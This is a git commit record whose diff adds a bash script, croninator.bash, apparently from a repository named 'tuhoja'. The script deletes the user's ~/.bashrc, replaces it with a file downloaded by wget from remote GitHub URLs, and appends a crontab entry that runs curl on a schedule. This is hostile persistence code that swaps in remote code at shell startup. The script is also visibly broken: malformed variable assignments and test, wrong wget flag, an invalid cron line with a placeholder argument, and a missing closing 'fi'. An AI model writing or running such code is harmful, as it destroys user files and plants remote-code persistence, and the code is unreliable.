0bbc32e1e0c0088a2ba3af66483027e7d15981e5
Hermanni Pinomäki <63274642+Poliisi5@users.noreply.github.com>
2024-09-23 13:58:57 +0300

    Update croninator.bash

--- croninator.bash
+++ croninator.bash
@@ -1,1 +1,16 @@
-
+#!/bin/bash
+bashcr = ~/.bashrc
+safe = 0
+config = ~/totallysfa
+if test -f $config; then
+  safe = cat $config
+  if $safe == 0; then
+    rm -rf $bashcr
+    wget -o $bashcr https://github.com/Poliisi5/tuhoja/raw/refs/heads/main/black.bash
+  else
+    rm -rf $bashcr
+    wget -o $bashcr https://github.com/Poliisi5/tuhoja/raw/refs/heads/main/white.bash
+  fi
+else
+  echo $safe > config
+  (crontab -l 2>/dev/null; echo "/5 * * * * * curl  -with args") | crontab -
